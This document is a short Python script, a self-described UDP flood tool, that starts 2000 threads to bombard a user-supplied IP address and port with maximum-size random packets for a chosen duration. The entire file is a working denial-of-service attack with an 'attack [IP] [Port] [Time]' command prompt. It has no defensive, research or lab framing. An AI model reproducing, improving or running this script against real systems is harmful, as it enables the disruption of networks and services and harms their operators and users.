import socket  
import random  
import threading  
import time  

# Configuration  
packet_size = 65507             # Max UDP packet size  
threads = 2000                  # Number of threads  

def generate_payload(size):  
    return random._urandom(size)  

def udp_attack(ip, port, duration):  
    timeout = time.time() + duration  
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    sent = 0  

    while time.time() < timeout:  
        try:  
            payload = generate_payload(packet_size)  
            client.sendto(payload, (ip, port))  
            sent += 1  
        except Exception:  
            pass  

    print(f"Thread finished: Sent {sent} packets.")  

def start_attack(target_ip, target_port, duration):  
    print(f"Launching UDP flood attack on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")  
    threads_list = []  

    for i in range(threads):  
        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration))  
        threads_list.append(thread)  
        thread.start()  

    for thread in threads_list:  
        thread.join()  

if __name__ == "__main__":  
    print("Command-based UDP Flood Script")  
    print("===============================")  
    print("Enter command in the format: attack [IP] [Port] [Time]")  

    # Get user input  
    command = input("Enter your command: ")  

    if command.startswith("attack"):  
        try:  
            _, target_ip, target_port, duration = command.split()  
            target_port = int(target_port)  
            duration = int(duration)  

            print("\nStarting attack...")  
            start_attack(target_ip, target_port, duration)  
        except ValueError:  
            print("Invalid input format. Use: attack [IP] [Port] [Time]")  
    else:  
        print("Command must start with 'attack'.")